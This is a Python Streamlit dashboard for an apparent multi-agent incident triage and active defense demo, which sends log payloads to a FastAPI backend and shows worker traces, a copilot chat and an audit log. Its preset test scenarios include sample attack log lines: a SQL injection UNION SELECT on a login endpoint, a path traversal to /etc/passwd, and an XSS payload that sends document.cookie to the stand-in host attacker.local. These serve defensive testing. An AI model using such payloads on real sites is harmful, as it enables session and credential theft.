import streamlit as st
import json
import uuid
import time
from datetime import datetime, timezone
import httpx

st.set_page_config(
    page_title="Huawei Cloud MaaS — Autonomous Incident Triage & Active Defense",
    page_icon="https://cdn-icons-png.flaticon.com/512/3135/3135715.png",
    layout="wide",
    initial_sidebar_state="expanded"
)

if "history_records" not in st.session_state:
    st.session_state["history_records"] = []
if "is_contained" not in st.session_state:
    st.session_state["is_contained"] = False
if "chat_messages" not in st.session_state:
    st.session_state["chat_messages"] = [
        {"role": "assistant", "content": "Hello. I am the Huawei Cloud MaaS SRE Copilot powered by Pangu 40B / glm-5.2. I have full= context on the current infrastructure and security state. How can I assist you with this incident?"}
    ]
if "worker_trace" not in st.session_state:
    st.session_state["worker_trace"] = []

PRESET_MAP = {
    "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)": {
        "source": "security-scanner", "component": "auth",
        "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
        "is_sec": True, "sev": "P1"
    },
    "[Security] Cross-Site Scripting Injection in Search Query (<script>)": {
        "source": "security-scanner", "component": "frontend",
        "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
        "is_sec": True, "sev": "P1"
    },
    "[Security] Path Traversal Attempt on /etc/passwd": {
        "source": "security-scanner", "component": "frontend",
        "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
        "is_sec": True, "sev": "P1"
    },
    "[Infrastructure] Database Connectivity Outage (TCP 27017)": {
        "source": "mongodb", "component": "database",
        "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
        "is_sec": False, "sev": "P1"
    },
    "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)": {
        "source": "nextjs", "component": "frontend",
        "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup limit exceeded.",
        "is_sec": False, "sev": "P1"
    }
}

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
    * { box-sizing: border-box; }
    html, body, [class*="css"] { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #f1f5f9; }
    code, pre, .terminal-text { font-family: 'JetBrains Mono', monospace !important; }
    .stApp { background-color: #090d16; color: #f1f5f9; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
    .animated-fade { animation: fadeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
    .header-panel { background: linear-gradient(180deg, rgba(30, 41, 59, 0.4) 0%, rgba(15, 23, 42, 0.6) 100%); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; padding: 20px 26px; margin-bottom: 20px; backdrop-filter: blur(12px); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
    .status-pill { display: inline-flex; align-items: center; gap: 8px; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; padding: 5px 12px; border-radius: 9999px; font-size: 11px; font-weight: 600; letter-spacing: 0.6px; text-transform: uppercase; }
    .status-dot { width: 7px; height: 7px; background-color: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; }
    .topology-container { display: flex; justify-content: space-between; align-items: center; background: rgba(15, 23, 42, 0.5); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 14px 18px; margin-bottom: 18px; gap: 10px; flex-wrap: wrap; }
    .topology-node { flex: 1; min-width: 125px; background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 10px; text-align: center; transition: all 0.3s ease; }
    .node-healthy { border-color: rgba(16, 185, 129, 0.4); }
    .node-healthy .node-title { color: #34d399; }
    .node-compromised { border-color: rgba(239, 68, 68, 0.8) !important; background: rgba(239, 68, 68, 0.15) !important; box-shadow: 0 0 16px rgba(239, 68, 68, 0.3); }
    .node-compromised .node-title { color: #f87171 !important; font-weight: 700; }
    .node-contained { border-color: rgba(59, 130, 246, 0.8) !important; background: rgba(59, 130, 246, 0.15) !important; box-shadow: 0 0 16px rgba(59, 130, 246, 0.3); }
    .node-contained .node-title { color: #60a5fa !important; }
    .node-title { font-size: 11px; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-bottom: 2px; }
    .node-status { font-size: 11px; color: #94a3b8; font-weight: 500; }
    .metric-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 14px 18px; transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1); }
    .metric-card:hover { border-color: rgba(59, 130, 246, 0.4); transform: translateY(-2px); background: rgba(30, 41, 59, 0.6); }
    .metric-label { color: #94a3b8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; margin-bottom: 4px; }
    .metric-val { font-size: 22px; font-weight: 700; letter-spacing: -0.5px; }
    .badge-soc { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171 !important; padding: 3px 10px; border-radius: 6px; font-weight: 600; font-size: 12px; letter-spacing: 0.5px; display: inline-block; }
    .badge-sre { background: rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.4); color: #60a5fa !important; padding: 3px 10px; border-radius: 6px; font-weight: 600; font-size: 12px; letter-spacing: 0.5px; display: inline-block; }
    .worker-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); color: #60a5fa; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; margin: 2px; }
    .worker-badge.active { background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.5); color: #34d399; }
    .trace-step { background: rgba(15, 23, 42, 0.45); border: 1px solid rgba(255, 255, 255, 0.07); border-left: 3px solid #3b82f6; border-radius: 6px; padding: 12px 16px; margin-bottom: 10px; font-size: 13px; }
    .trace-step-header { font-weight: 600; color: #93c5fd; margin-bottom: 4px; display: flex; justify-content: space-between; }
    .stButton>button { background: #2563eb; color: #ffffff; border: none; border-radius: 8px; padding: 12px 24px; font-weight: 600; font-size: 14px; letter-spacing: 0.3px; transition: all 0.2s ease; }
    .stButton>button:hover { background: #1d4ed8; box-shadow: 0 4px 16px rgba(37, 99, 235, 0.35); transform: translateY(-1px); }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("### **System Infrastructure**")
    st.caption("Huawei Cloud MaaS Platform — Supervisor-Worker Multi-Agent")
    st.markdown("---")
    fastapi_url = st.text_input("FastAPI URL", "http://localhost:8000")
    webhook_api_key = st.text_input("Webhook API Key", type="password")
    st.markdown("#### **Performance Benchmarks**")
    col_sb1, col_sb2 = st.columns(2)
    with col_sb1:
        st.metric("Manual MTTD", "30m")
    with col_sb2:
        st.metric("Agentic MTTD", "< 15s", delta="-99.2%")
    st.markdown("---")
    st.markdown("#### **Architecture**")
    st.markdown("• **Supervisor:** glm-5.2 (Kostra)")
    st.markdown("• **Workers:** triage, threat_intel, forensics")
    st.markdown("• **Workers:** containment, communicator, reporter")
    st.markdown("• **Database:** Supabase (PostgreSQL)")
    st.markdown("• **Vector Store:** Qdrant (RAG)")

st.markdown("""
<div class="header-panel animated-fade">
    <div>
        <h2 style="margin: 0; font-size: 22px; font-weight: 700; color: #f8fafc; letter-spacing: -0.3px;">
            Autonomous Incident Triage & Active Defense System
        </h2>
        <p style="margin: 4px 0 0 0; color: #94a3b8; font-size: 13px;">
            Supervisor-Worker multi-agent architecture · LangGraph · Kostra glm-5.2 · 6 specialized workers
        </p>
    </div>
    <div><div class="status-pill"><div class="status-dot"></div>System Online</div></div>
</div>
""", unsafe_allow_html=True)

active_component = None
is_contained = st.session_state.get("is_contained", False)
if "last_payload" in st.session_state:
    active_component = st.session_state["last_payload"].get("component")

def get_node_class(comp_name):
    if active_component == comp_name:
        return "node-contained" if is_contained else "node-compromised"
    return "node-healthy"

def get_node_status_text(comp_name):
    if active_component == comp_name:
        return "CONTAINED" if is_contained else "INCIDENT DETECTED"
    return "OPERATIONAL"

st.markdown(f"""
<div class="topology-container animated-fade">
    <div class="topology-node {get_node_class('network')}"><div class="node-title">WAF / Network</div><div class="node-status">{get_node_status_text('network')}</div></div>
    <div style="color: #64748b; font-size: 16px;">→</div>
    <div class="topology-node {get_node_class('auth')}"><div class="node-title">Auth Service</div><div class="node-status">{get_node_status_text('auth')}</div></div>
    <div style="color: #64748b; font-size: 16px;">→</div>
    <div class="topology-node {get_node_class('frontend')}"><div class="node-title">Next.js App</div><div class="node-status">{get_node_status_text('frontend')}</div></div>
    <div style="color: #64748b; font-size: 16px;">→</div>
    <div class="topology-node {get_node_class('database')}"><div class="node-title">Supabase (PG)</div><div class="node-status">{get_node_status_text('database')}</div></div>
    <div style="color: #64748b; font-size: 16px;">→</div>
    <div class="topology-node node-healthy"><div class="node-title">Kostra glm-5.2</div><div class="node-status">CONNECTED</div></div>
</div>
""", unsafe_allow_html=True)

col_left, col_right = st.columns([1.05, 1.25], gap="large")

with col_left:
    st.markdown("#### **Incident Telemetry Ingestion**")
    preset = st.selectbox("Load test scenario:", ["Custom..."] + list(PRESET_MAP.keys()))
    selected_data = PRESET_MAP.get(preset, {})

    col_meta1, col_meta2 = st.columns(2)
    with col_meta1:
        source = st.selectbox("Source", ["nextjs", "mongodb", "security-scanner"], index=["nextjs", "mongodb", "security-scanner"].index(selected_data.get("source", "nextjs")))
    with col_meta2:
        component = st.selectbox("Component", ["frontend", "database", "network", "auth"], index=["frontend", "database", "network", "auth"].index(selected_data.get("component", "frontend")))

    is_sec = st.checkbox("Flag as Security Event", value=selected_data.get("is_sec", False))
    raw_log = st.text_area("Raw Log Data", value=selected_data.get("log", ""), height=120, placeholder="Paste log stream or telemetry error...")

    if st.button("Run Autonomous Triage", type="primary", use_container_width=True):
        if not raw_log.strip():
            st.error("Please enter a valid log message.")
        else:
            payload = {
                "incident_id": str(uuid.uuid4()),
                "source": source,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "component": component,
                "raw_log": raw_log.strip(),
                "is_security_event": is_sec,
                "severity_hint": selected_data.get("sev", "P2")
            }
            st.session_state["last_payload"] = payload
            st.session_state["is_contained"] = False
            st.session_state["worker_trace"] = []

            headers = {}
            if webhook_api_key:
                headers["X-Webhook-Key"] = webhook_api_key

            progress = st.progress(0, text="Supervisor starting...")
            status_text = st.empty()

            try:
                import threading
                result_holder = {}
                error_holder = {}

                def run_triage():
                    try:
                        with httpx.Client(timeout=600.0) as client:
                            resp = client.post(f"{fastapi_url.rstrip('/')}/triage", json=payload, headers=headers)
                            result_holder["data"] = resp.json()
                            result_holder["status"] = resp.status_code
                    except Exception as e:
                        error_holder["msg"] = str(e)

                t = threading.Thread(target=run_triage, daemon=True)
                t.start()

                steps = ["Supervisor routing...", "triage worker...", "threat_intel worker...", "forensics worker...", "containment worker...", "communicator worker...", "reporter worker...", "Finalizing..."]
                i = 0
                while t.is_alive():
                    progress.progress((i % 7) / 7, text=f"Executing: {steps[i % len(steps)]}")
                    status_text.markdown(f"⏳ {steps[i % len(steps)]} ({i*5}s elapsed)")
                    t.join(timeout=5)
                    i += 1

                if error_holder:
                    st.error(f"Error: {error_holder['msg']}")
                elif result_holder.get("status") == 200:
                    triage_res = result_holder["data"]
                    route = triage_res.get("route", [])
                    progress.progress(1.0, text="Complete!")
                    status_text.success(f"Done! Workers: {', '.join(route)}")

                    st.session_state["last_triage"] = triage_res
                    st.session_state["worker_trace"] = route
                    st.session_state["history_records"].insert(0, {
                        "timestamp": datetime.now(timezone.utc).strftime("%H:%M:%S UTC"),
                        "incident_id": triage_res.get("incident_id", "")[:8],
                        "component": payload.get("component"),
                        "type": "Cybersecurity" if is_sec else "Infrastructure",
                        "route": route,
                        "cost": triage_res.get("cost_usd", 0),
                        "status": "TRIAGED"
                    })
                    st.rerun()
                else:
                    st.error(f"Error: {result_holder.get('status', 'unknown')}")
            except Exception as e:
                st.error(f"Error: {e}")

    st.markdown("<br>", unsafe_allow_html=True)
    st.markdown("#### **Worker Execution Trace**")
    trace = st.session_state.get("worker_trace", [])
    if trace:
        badges = "".join([f'<span class="worker-badge active">{w}</span>' for w in trace])
        st.markdown(f'<div style="margin-bottom: 12px;">{badges}</div>', unsafe_allow_html=True)
    else:
        st.caption("No workers executed yet.")

with col_right:
    st.markdown("#### **Diagnostic Output & Action Plan**")

    if "last_triage" in st.session_state:
        data = st.session_state["last_triage"]
        payload_data = st.session_state.get("last_payload", {})
        route = data.get("route", [])
        answer = data.get("answer", "")

        kpi_col1, kpi_col2, kpi_col3 = st.columns(3)
        with kpi_col1:
            st.markdown(f"""<div class="metric-card animated-fade"><div class="metric-label">Workers Used</div><div class="metric-val" style="color: #38bdf8;">{len(route)}</div></div>""", unsafe_allow_html=True)
        with kpi_col2:
            cost = data.get("cost_usd", 0)
            st.markdown(f"""<div class="metric-card animated-fade"><div class="metric-label">LLM Cost</div><div class="metric-val" style="color: #34d399;">${cost:.4f}</div></div>""", unsafe_allow_html=True)
        with kpi_col3:
            is_security = payload_data.get("is_security_event", False)
            badge = "badge-soc" if is_security else "badge-sre"
            label = "SOC" if is_security else "SRE"
            st.markdown(f"""<div class="metric-card animated-fade"><div class="metric-label">Classification</div><div style="margin-top: 4px;"><span class="{badge}">{label}</span></div></div>""", unsafe_allow_html=True)

        st.markdown("<br>", unsafe_allow_html=True)

        tab_summary, tab_trace, tab_copilot, tab_audit = st.tabs([
            "Final Answer",
            "Worker Trace",
            "AI Copilot Chat",
            "Audit Log"
        ])

        with tab_summary:
            st.markdown("##### **Supervisor Final Output**")
            if answer:
                st.write(answer)
            else:
                st.warning("No final answer returned.")

        with tab_trace:
            st.markdown("##### **Worker Execution Pipeline**")
            st.caption("Supervisor → Worker → Supervisor → ... → END")
            if route:
                for i, worker in enumerate(route):
                    st.markdown(f"""
                    <div class="trace-step">
                        <div class="trace-step-header">
                            <span>Step {i+1}: <b>{worker}</b></span>
                            <span style="font-size: 11px; color: #34d399;">DONE</span>
                        </div>
                    </div>
                    """, unsafe_allow_html=True)
            else:
                st.info("No trace available.")

        with tab_copilot:
            st.markdown("##### **Operator AI Assistant (glm-5.2 — Live LLM)**")
            st.caption("Ask questions about this specific incident:")
            for msg in st.session_state["chat_messages"]:
                with st.chat_message(msg["role"]):
                    st.write(msg["content"])

            if user_query := st.chat_input("Ask SRE Copilot..."):
                st.session_state["chat_messages"].append({"role": "user", "content": user_query})
                with st.chat_message("user"):
                    st.write(user_query)

                incident_context = {
                    "incident_id": data.get("incident_id"),
                    "component": payload_data.get("component"),
                    "route": route,
                    "answer": answer[:500],
                }

                with st.chat_message("assistant"):
                    with st.spinner("glm-5.2 is reasoning..."):
                        try:
                            headers = {}
                            if webhook_api_key:
                                headers["X-Webhook-Key"] = webhook_api_key
                            res = httpx.post(
                                f"{fastapi_url.rstrip('/')}/copilot/chat",
                                json={"message": user_query, "incident_context": incident_context},
                                headers=headers,
                                timeout=30.0
                            )
                            if res.status_code == 200:
                                reply = res.json().get("reply", "No response.")
                            else:
                                reply = f"[Error {res.status_code}]"
                        except Exception as e:
                            reply = f"[Error]: {e}"
                    st.write(reply)
                st.session_state["chat_messages"].append({"role": "assistant", "content": reply})

        with tab_audit:
            st.markdown("##### **Session Incident History**")
            if st.session_state["history_records"]:
                for r in st.session_state["history_records"]:
                    route_str = " → ".join(r.get("route", []))
                    st.markdown(f"""
                    <div class="trace-step">
                        <div class="trace-step-header">
                            <span>{r['timestamp']} — <b>{r['incident_id']}</b></span>
                            <span style="font-size: 11px; color: #34d399;">{r['status']}</span>
                        </div>
                        <div style="color: #94a3b8; font-size: 12px;">
                            Component: {r['component']} | Type: {r['type']} | Cost: ${r.get('cost', 0):.4f}<br>
                            Route: {route_str}
                        </div>
                    </div>
                    """, unsafe_allow_html=True)
            else:
                st.info("No incidents processed yet.")

    else:
        st.markdown("""
        <div class="animated-fade" style="text-align: center; padding: 64px 24px; border: 1px dashed rgba(255, 255, 255, 0.12); border-radius: 12px; background: rgba(15, 23, 42, 0.25);">
            <div style="font-size: 15px; font-weight: 600; color: #94a3b8;">Awaiting Telemetry Signals</div>
            <div style="font-size: 13px; color: #64748b; margin-top: 6px; max-width: 360px; margin-left: auto; margin-right: auto;">
                Select a scenario and click <b>Run Autonomous Triage</b> to initiate the supervisor-worker pipeline.
            </div>
        </div>
        """, unsafe_allow_html=True)
